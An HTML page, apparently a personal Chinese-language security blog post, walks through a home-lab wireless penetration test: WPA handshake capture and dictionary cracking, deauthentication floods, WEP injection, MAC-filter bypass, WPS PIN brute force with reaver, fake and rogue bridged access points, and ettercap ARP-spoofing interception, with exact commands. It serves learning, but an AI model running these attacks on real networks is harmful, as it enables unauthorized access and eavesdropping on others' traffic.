@@ -1,0 +1,291 @@
+<!doctype html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    
+    <title>无线安全初探 | 1ABlades&#39; blog</title>
+    
+    <link rel="alternative" href="/atom.xml" title="1ABlades&#39; blog" type="application/atom+xml">
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+    <link rel="stylesheet" href="/libs/fancybox/jquery.fancybox.css" charset="utf-8">
+    
+    <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+</head>
+<body class="site">
+    <header class="site-header">
+        <h1 class="site-title"><a href="/">1ABlades&#39; blog</a></h1>
+        <nav class="site-nav">
+            <ul class="nav">
+                
+                <li><a href="/archives">Archives</a></li>
+                
+                
+                <li><a href="/atom.xml" title="RSS Feed">rss</a></li>
+                
+                <li><a class="toggle-search" href="#search">search</a></li>
+            </ul>
+        </nav>
+        <div class="site-search" id="search">
+            <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><input type="hidden" name="sitesearch" value="1ablades.github.io"></form>
+        </div>
+        
+            <div class="site-header-background" style="background-image:url(http://reumia.github.io/hexo-theme-zzoman2015/images/background-zzoman2015.jpg)"></div>
+        
+    </header>
+    <div class="site-body">
+        <div class="global-width">
+    <article class="article" data-layout="post" data-slug="无线安全初探">
+        <div class="article-content">
+            
+            
+            <header class="article-header">
+                <div class="article-meta">
+                    <a href="/2019/04/02/无线安全初探/" class="article-date">
+  <time datetime="2019-04-02T06:56:44.000Z">2019-04-02</time>
+</a>
+                    
+                    
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/无线安全/">无线安全</a></li></ul>
+
+                </div>
+                
+    <h1 class="article-title" itemprop="name">
+      <a href="/2019/04/02/无线安全初探/">无线安全初探</a>
+    </h1>
+
+            </header>
+            
+            <div class="article-body">
+                <h1 id="0x01-无线基础"><a href="#0x01-无线基础" class="headerlink" title="0x01 无线基础"></a>0x01 无线基础</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>SSID：又称ESSID是一个无线AP的名称。<br>BSSID：无线AP的MAC地址，用于数据链路程数据帧传输<br>信道（频道）：无线网络信号在空气中以电磁波传播，他的频率是2.4～2.4835GHz，而这些频段又被化分为11或13个信道（802.11b/g网络标准，普通路由都是这个标准） </p>
+<p>通常情况下，默认的信道是“6”，这在单一的无线网络环境中可以正常使用，但如果处于多个无线网络的覆盖范围内，无线路由器都使用默认的信道“6”，肯定会产生冲突的，影响无线网络的性能。<br>虽然在802.11b/g网络标准中，无线网络的信道虽然可以有13个，但非重叠的信道，也就是不互相干扰的信道只有1、6、11（或13）这三个。   </p>
+<h2 id="加密方式"><a href="#加密方式" class="headerlink" title="加密方式"></a>加密方式</h2><h3 id="WPA-PSK-WPA2-PSK"><a href="#WPA-PSK-WPA2-PSK" class="headerlink" title="WPA-PSK/WPA2-PSK"></a>WPA-PSK/WPA2-PSK</h3><p>WPA-PSK/WPA2-PSK安全类型其实是WPA/WPA2的一种简化版本，它是基于共享密钥的WPA模式，安全性很高，设置也比较简单，适合普通家庭用户和小型企业使用。</p>
+<h3 id="WPA-WPA2"><a href="#WPA-WPA2" class="headerlink" title="WPA/WPA2"></a>WPA/WPA2</h3><p>WPA/WPA2是一种比WEP强大的加密算法，选择这种安全类型，路由器将采用Radius服务器进行身份认证并得到密钥的WPA或WPA2安全模式。由于要架设一台专用的认证服务器，代价比较昂贵且维护也很复杂，所以不推荐普通用户使用此安全类型。</p>
+<h3 id="WEP"><a href="#WEP" class="headerlink" title="WEP"></a>WEP</h3><p>WEP是Wired Equivalent Privacy的缩写，它是一种基本的加密方法，其安全性不如另外两种安全类型高。选择WEP安全类型，路由器将使用802.11基本的WEP安全模式。 这里需要注意的是因为802.11N不支持此加密方式，如果您选择此加密方式，路由器可能会工作在较低的传输速率上。</p>
+<h2 id="加密方法"><a href="#加密方法" class="headerlink" title="加密方法"></a>加密方法</h2><h3 id="QSS"><a href="#QSS" class="headerlink" title="QSS"></a>QSS</h3><p>QSS又称快速安全设置，通过按下无线路由和无线网卡上的QSS按钮，即可自动建立WPA2级别的安全连接，无需在路由器或网卡管理软件的界面上进行繁琐的设置，大大简化无线安全设置的操作。  </p>
+<h3 id="WPS"><a href="#WPS" class="headerlink" title="WPS"></a>WPS</h3><p>WPS（Wi-Fi Protected Setup，WiFi保护设置），它是由WiFi联盟组织实施的可选认证项目，它主要致力于简化无线网络设置及无线网络加密等工作。一般情况下，用户在新建一个无线网络时，为了保证无线网络的安全，都会对无线网络名称（SSID）和无线加密方式进行设置，即“隐藏SSID”和设置“无线网络连接密码”</p>
+<h3 id="WPS-PIN码"><a href="#WPS-PIN码" class="headerlink" title="WPS PIN码"></a>WPS PIN码</h3><p>WPS PIN码的第8位数是一个校验和（checksum），因此黑客只需算出前7位数即可。这样，唯一的PIN码的数量降了一个级次变成了10的7次方，也就是说有1000万种变化。<br>在 实施PIN的身份识别时，接入点(无线路由器)实际上是要找出这个PIN的前半部分(前4位)和后半部分(后3位)是否正确即可。当第一次PIN认证连接 失败后，路由器会向客户端发回一个EAP-NACK信息，而通过该回应，攻击者将能够确定的PIN前半部或后半部是否正确。换句话说，黑客只需从7位数的 PIN中找出一个4位数的PIN和一个3位数的PIN。这样一来，级次又被降低，从1000万种变化，减少到11000（10的4次方+10的3次方）种 变化。因此，在实际破解尝试中，黑客最多只需试验11000次，平均只需试验大约5500次就能破解。这也证实了在2小时内破解PIN码的可行性。</p>
+<h1 id="0x02-渗透思路"><a href="#0x02-渗透思路" class="headerlink" title="0x02 渗透思路"></a>0x02 渗透思路</h1><p>WEP加密方式，通过漏洞破解（少见）<br>开启wps功能的，通过pin码破解<br>Wpa/wpa2加密，通过抓取握手包，暴力穷举密码破解  </p>
+<h1 id="0x03-实战演练"><a href="#0x03-实战演练" class="headerlink" title="0x03 实战演练"></a>0x03 实战演练</h1><p>网卡：TP-Link TL-WN722N<br>路由器： D-Link dir-615</p>
+<h2 id="0、基本命令"><a href="#0、基本命令" class="headerlink" title="0、基本命令"></a>0、基本命令</h2><pre><code>iwconfig          //查看网卡信息、进行配置
+
+iwconfig wlan0mon channel 5         //切换网卡信道
+
+iwconfig wlan0 essid &quot;&quot; key 12345678            //连接无线
+</code></pre><p>iwconfig并不能连接wpa网络，我们需要借助工具 WPA_supplicant<br>首先配置文件 <code>wpa-supp.conf</code></p>
+<pre><code># WPA-PSK/TKIP
+network={
+    ssid=&quot;dirua&quot;
+    key_mgmt=WPA-PSK
+    proto=WPA
+    painwise=TKIP
+    group=TKIP
+    psk=&quot;12345678&quot;
+}
+</code></pre><p>然后执行</p>
+<pre><code>wpa_supplicant -D wext -i wlan0 –c wpa-supp.conf 
+</code></pre><h2 id="1、破解WPA-PSK"><a href="#1、破解WPA-PSK" class="headerlink" title="1、破解WPA-PSK"></a>1、破解WPA-PSK</h2><p>连接网卡后Kill掉网卡进程</p>
+<pre><code>airmon-ng check kill
+</code></pre><p>然后开启网卡</p>
+<pre><code>airmon-ng start wlan0
+</code></pre><p>这时你的网卡名称变为wlan0mon，也有可能不变<br><img src="https://1ablades.oss-cn-beijing.aliyuncs.com/img/20190322145441.png" alt=""></p>
+<p>进行wifi嗅探，获取到BSSID和ESSID</p>
+<pre><code>airodump-ng wlan0mon
+</code></pre><p><img src="https://1ablades.oss-cn-beijing.aliyuncs.com/img/20190322145843.png" alt=""></p>
+<p>选择一个有数据（data列有数据）传输的wifi进行抓包</p>
+<pre><code>airodump-ng -c 1 --bssid 20:6B:E7:42:36:C0 -w /wlan/cap/xxx wlan0mon
+</code></pre><p>这里-c是指定信道 -w是你保存抓到的包的目录<br><img src="https://1ablades.oss-cn-beijing.aliyuncs.com/img/20190322150237.png" alt=""></p>
+<p>下面就是连接此网络的设备，如果没有设备连接我们就没法抓包</p>
+<p>然后重新开一个终端进行洪水攻击，获取握手包  </p>
+<pre><code>aireplay-ng -0 0 -a 20:6B:E7:42:36:C0 wlan0mon
+</code></pre><p><img src="https://1ablades.oss-cn-beijing.aliyuncs.com/img/20190322150647.png" alt=""></p>
+<p>待右上角出现WPA handshake 说明我们已经抓包成功，保存在我们之前指定的目录下</p>
+<p>然后跑包进行爆破密码</p>
+<pre><code>aircrack-ng -w /wlan/password/pass.txt /wlan/cap/xxx-01.cap
+</code></pre><p><img src="https://1ablades.oss-cn-beijing.aliyuncs.com/img/20190322152006.png" alt=""></p>
+<p>之后只需耐心等待，能不能破解就看你的字典够不够强大了<br>或者可以利用字典生成器例如chrunch，根据无线特征已知信息生成一些字典</p>
+<h2 id="2、隐藏SSID"><a href="#2、隐藏SSID" class="headerlink" title="2、隐藏SSID"></a>2、隐藏SSID</h2><p>开启隐藏SSID功能后，无线的名称就被隐藏了<br><img src="https://1ablades.oss-cn-beijing.aliyuncs.com/img/20190326132934.png" alt=""></p>
+<p>但是我们仍可以利用airodump-ng可以获取到无线信息，只是名称变成了长度<br><img src="https://1ablades.oss-cn-beijing.aliyuncs.com/img/20190326132144.png" alt=""></p>
+<h2 id="3、MAC地址过滤"><a href="#3、MAC地址过滤" class="headerlink" title="3、MAC地址过滤"></a>3、MAC地址过滤</h2><p><img src="https://1ablades.oss-cn-beijing.aliyuncs.com/img/20190326143747.png" alt=""></p>
+<pre><code>airodump-ng -c 2 -a --bssid 00:21:91:D2:8E:25 wlan0
+</code></pre><p>抓包发现连接设备的mac地址</p>
+<p><img src="https://1ablades.oss-cn-beijing.aliyuncs.com/img/20190326143827.png" alt=""></p>
+<p>然后修改本机mac地址</p>
+<pre><code>ifconfig wlan0mon down
+macchanger -m 11:22:32:33:ee:hh wlan0mon
+ifconfig wlan0mon up
+</code></pre><p><img src="https://1ablades.oss-cn-beijing.aliyuncs.com/img/20190326145325.png" alt=""></p>
+<p>即可绕过</p>
+<h2 id="4、跑包破解WEP"><a href="#4、跑包破解WEP" class="headerlink" title="4、跑包破解WEP"></a>4、跑包破解WEP</h2><p>这里我kill掉网卡进程，利用airmon-ng开启网卡监测，发现无法发现连接的设备/抓不到握手包，于是我直接airodump-ng wlan0    </p>
+<p><img src="https://1ablades.oss-cn-beijing.aliyuncs.com/img/20190326151704.png" alt=""></p>
+<pre><code>airodump-ng wlan0
+airodump-ng -c 1 --bssid 20:6B:E7:42:36:C0 -w /wlan/cap/wep wlan0
+</code></pre><p>arp注入攻击</p>
+<pre><code>aireplay-ng -3 -b &quot;AP Mac地址&quot; -h &quot;wifi Mac地址&quot; -x 1000 wlan0
+</code></pre><p>这里需要多跑一会，提高ivs值，多抓点包不然不容易破解</p>
+<p>破解密码</p>
+<pre><code>aircrack-ng -x -f 2 /wlan/cap/wep-*.cap
+</code></pre><p><img src="https://1ablades.oss-cn-beijing.aliyuncs.com/img/20190327133233.png" alt=""></p>
+<p><img src="https://1ablades.oss-cn-beijing.aliyuncs.com/img/20190326172348.png" alt=""></p>
+<h2 id="5、共享式WEP破解"><a href="#5、共享式WEP破解" class="headerlink" title="5、共享式WEP破解"></a>5、共享式WEP破解</h2><p><img src="https://1ablades.oss-cn-beijing.aliyuncs.com/img/20190326172732.png" alt=""></p>
+<p><img src="https://1ablades.oss-cn-beijing.aliyuncs.com/img/20190327085653.png" alt=""></p>
+<p>这里是想抓keystream然后伪装成一个共享秘钥认证</p>
+<pre><code>aireplay-ng -1 0 -e dirua -y keystream-01-00-21-91-D2-8E-25.xor -a  00:21:91:D2:8E:25 -h aa:aa:aa:aa:aa:aa mon0. aireplay-ng
+</code></pre><p>可以伪装mac地址直接进行连接<br>但是由于我抓不到keystream，显示broken ska于是没有成功</p>
+<p>后面抓取到了keystream进行连接，结果只认证成功了一半，还是没有成功连接</p>
+<h2 id="6、破解开启WPS的无线"><a href="#6、破解开启WPS的无线" class="headerlink" title="6、破解开启WPS的无线"></a>6、破解开启WPS的无线</h2><p><img src="https://1ablades.oss-cn-beijing.aliyuncs.com/img/20190327103229.png" alt=""></p>
+<p>扫描开启WPS的无线</p>
+<pre><code>wash -i wlan0 -C        //或者不加-C
+</code></pre><p>开始跑pin码，容易触发路由器安全机制，需要跑个几天</p>
+<pre><code>reaver -i wlan0mon -b C8:3A:35:30:3E:C8 -vv 
+</code></pre><p>如果出错可以加个 -N</p>
+<h2 id="7、创建假的接入点"><a href="#7、创建假的接入点" class="headerlink" title="7、创建假的接入点"></a>7、创建假的接入点</h2><p><img src="https://1ablades.oss-cn-beijing.aliyuncs.com/img/20190327135253.png" alt=""></p>
+<p>创建一个假的无线</p>
+<pre><code>airbase-ng -a AA:AA:AA:AA:AA:AA --essid &quot;dirua&quot; -c 7 wlan0mon
+</code></pre><p>当然我们也可以伪造成一样的MAC地址</p>
+<p><img src="https://1ablades.oss-cn-beijing.aliyuncs.com/img/20190327135419.png" alt=""></p>
+<p><img src="https://1ablades.oss-cn-beijing.aliyuncs.com/img/20190327135630.png" alt=""></p>
+<h2 id="8、caffe-latte攻击"><a href="#8、caffe-latte攻击" class="headerlink" title="8、caffe latte攻击"></a>8、caffe latte攻击</h2><p>我们可以利用用户接入我们的假接入点，获取wep秘钥进行破解</p>
+<p>首先让客户端连入正常的wep无线<br>开启假接入点  </p>
+<pre><code>airbase-ng --essid dirua -c 7 -a 6C:19:8F:BD:28:55 -L -W 1 wlan0mon
+</code></pre><p>这里mac地址最好不要和真的一样，因为如果一样之后也会被airbase发送封包导致无法连接</p>
+<p>然后我们向客户端发送解除验证封包</p>
+<pre><code>aireplay-ng -0 0 -a 6C:19:8F:BD:28:56 --ignore-negative-one wlan0mon
+</code></pre><p>如果我们的信号更好，用户设备就会连入我们的网络，airbase就会开始进行caffe latte攻击<br><img src="https://1ablades.oss-cn-beijing.aliyuncs.com/img/20190328103517.png" alt=""></p>
+<p>开启airodump收集数据包</p>
+<pre><code>airodump-ng --bssid 6C:19:8F:BD:28:56 -w /wlan/cap/keystream wlan0mon
+</code></pre><p><img src="https://1ablades.oss-cn-beijing.aliyuncs.com/img/20190328104113.png" alt=""></p>
+<p>获取到数据包，就可以像之前一样aircrack破解wep</p>
+<p>将airbase的 <code>-L</code> 参数换为 <code>-N</code> 即可进行Hirte攻击，它其实是caffe latte 的扩展，攻击流程与上相同</p>
+<h2 id="8、未授权接入点"><a href="#8、未授权接入点" class="headerlink" title="8、未授权接入点"></a>8、未授权接入点</h2><p>我们可以利用创建接入点+桥接创造一个后门，绕过无线的安全控制，直接未授权访问</p>
+<p>首先我们需要安装一个桥接工具 <code>bridge-utils</code></p>
+<pre><code>apt-get install bridge-utils
+
+brctl addbr Wifi-Bridge         //创建桥接接口命名为Wifi-Bridge
+
+airbase-ng --essid &quot;rouge&quot; -c 11 wlan0
+
+brctl addif Wifi-Bridge eth0
+brctl addif Wifi-Bridge at0             //将以太网和airbase-ng创建的at0虚拟接口添加到桥接中
+
+ifconfig eth0 0.0.0.0 up
+ifconfig at0 0.0.0.0 up             //启动接口进行桥接
+
+echo 1 &gt; /proc/sys/net/ipv4/ip_forward             //开启内核中的ip转发确保封包被转发
+</code></pre><p><img src="https://1ablades.oss-cn-beijing.aliyuncs.com/img/20190327144606.png" alt=""></p>
+<h2 id="10、中间人攻击"><a href="#10、中间人攻击" class="headerlink" title="10、中间人攻击"></a>10、中间人攻击</h2><p>MITM 攻击可能是 WLAN 系统上最有潜力的攻击之一了。实施攻击可以使用不同的配置，我<br>们会使用最普遍的一个 – 攻击者使用有线 LAN 连接到互联网，并在客户端的网卡上创建了假<br>的接入点。这个接入点广播的 SSID 和附近的本地热点相似。用户可能碰巧连接到这个假的接<br>入点（或者由于更高的信号强度理论强制连接，我们之前讨论过） ，并且可能仍旧相信它连<br>接到正常的接入点上。<br>攻击者现在可以将所有用户流量转发到互联网上，使用它所创建的有线和无线之间的网桥。<br>在下面的练习中，我们会模拟这个攻击。</p>
+<h3 id="使用ettercap进行arp欺骗"><a href="#使用ettercap进行arp欺骗" class="headerlink" title="使用ettercap进行arp欺骗"></a>使用ettercap进行arp欺骗</h3><p>这里把我的物理机作为被攻击机，连接无线<br>kali中，连接无线网<br>开启ettercap</p>
+<pre><code>ettercap -G
+</code></pre><p><code>sniff -&gt; unified sniffing -&gt; wlan0</code>  选择网卡<br><code>host -&gt; scan for hosts</code> 扫描主机<br><code>host -&gt; host list</code> 显示主机<br>右键将被攻击机（物理机） <code>add to target 1</code><br>将网关（路由器）<code>add to target 2</code><br><code>mitm -&gt; arp poisoning</code> 开始arp欺骗</p>
+<p>查看一下被攻击机的arp<br><img src="https://1ablades.oss-cn-beijing.aliyuncs.com/img/20190328141440.png" alt=""></p>
+<p>0.103 是我的kali，也就是说被攻击主机误认为192.168.1.103是它的网关。</p>
+<p>我们在kali中开启wireshark抓取wlan0的包<br><img src="https://1ablades.oss-cn-beijing.aliyuncs.com/img/20190328141644.png" alt=""></p>
+<p>发现0.103的流量都已经被抓取了</p>
+<p>这里使用ettercap arp欺骗后，被攻击机将无法上网，因为ettercap自带ip转发功能，为了不会出现两次转发，默认禁用系统的ip转发功能。</p>
+<p>我在虚拟机的网段中进行试验，使用eth0可以转发成功，而连接无线使用wlan0后，无法成功转发。。</p>
+<h2 id="11、企业级wpa-部署蜜罐"><a href="#11、企业级wpa-部署蜜罐" class="headerlink" title="11、企业级wpa 部署蜜罐"></a>11、企业级wpa 部署蜜罐</h2><p>需要利用RADIUS服务器</p>
+<h3 id="RADIUS安装-配置"><a href="#RADIUS安装-配置" class="headerlink" title="RADIUS安装/配置"></a>RADIUS安装/配置</h3><p><a href="https://www.samba.org/ftp/talloc/talloc-2.17.tar.gz" target="_blank" rel="external">https://www.samba.org/ftp/talloc/talloc-2.17.tar.gz</a><br>ftp://ftp.freeradius.org/pub/freeradius/freeradius-server-3.0.18.tar.gz</p>
+<p>分别安装talloc和freeradius</p>
+<p>两者都是解压后进入文件夹</p>
+<pre><code>./configure            //安装radius时可能会报openssl的错 可以使用./configure --with-openssl=no
+make &amp;&amp; make install
+</code></pre><p>我这路由器硬件版本太低。。不支持wpa-enterprise，下次有机会再利用</p>
+<h2 id="12、攻击路由器"><a href="#12、攻击路由器" class="headerlink" title="12、攻击路由器"></a>12、攻击路由器</h2><p><a href="http://routerpwn.com/" target="_blank" rel="external">http://routerpwn.com/</a><br>这个网站有各种路由器各个版本的漏洞，可以直接在网站利用</p>
+
+            </div>
+        </div>
+    </article>
+
+    
+    
+<nav class="article-nav">
+  
+  
+    <a href="/2017/12/17/Web安全之SQL注入/" id="article-nav-older" class="article-nav-link-wrap next">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Web安全之SQL注入初探</div>
+    </a>
+  
+</nav>
+
+    
+
+    
+</div>
+    </div>
+    <footer class="site-footer">
+        <div class="global-width">
+            <ul class="site-widget">
+                
+                <li class="widget widget-tag">
+                    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget-body">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/">Python</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web安全/">Web安全</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/writeup/">writeup</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/密码学/">密码学</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/无线安全/">无线安全</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/算法/">算法</a><span class="tag-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+                </li>
+                
+                <li class="widget widget-category">
+                    
+                </li>
+                
+                <li class="widget widget-recent_posts">
+                    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recents</h3>
+    <div class="widget-body">
+      <ul>
+        
+          <li>
+            <a href="/2019/04/02/无线安全初探/">无线安全初探</a>
+          </li>
+        
+          <li>
+            <a href="/2017/12/17/Web安全之SQL注入/">Web安全之SQL注入初探</a>
+          </li>
+        
+          <li>
+            <a href="/2017/12/03/ctf中的RSA总结/">ctf中的RSA总结</a>
+          </li>
+        
+          <li>
+            <a href="/2017/12/03/2017湖湘杯writeup/">2017湖湘杯writeup</a>
+          </li>
+        
+          <li>
+            <a href="/2017/11/07/2017山东大学生网络安全技能大赛决赛writeup/">2017山东大学生网络安全技能大赛决赛writeup.md</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+                </li>
+                
+            </ul>
+        </div>
+        <div class="site-info">
+            <address>
+                &copy; 2014 <a href="1ablades.github.io">1ABlades&#39; blog</a> All Right Reserved. <br/>
+                Powered by <a href="http://hexo.io">Hexo</a>. Theme by <a href="http://zzoman.com">ZZOMAN</a>
+            </address>
+        </div>
+    </footer>
+    
+    <script src="/libs/jquery-1.11.3.min.js" type="text/javascript"></script>
+    
+    <script src="/libs/fancybox/jquery.fancybox.js" type="text/javascript"></script>
+    
+    <script src="/js/site_init.js" type="text/javascript"></script>
+    
+</body>
+</html>
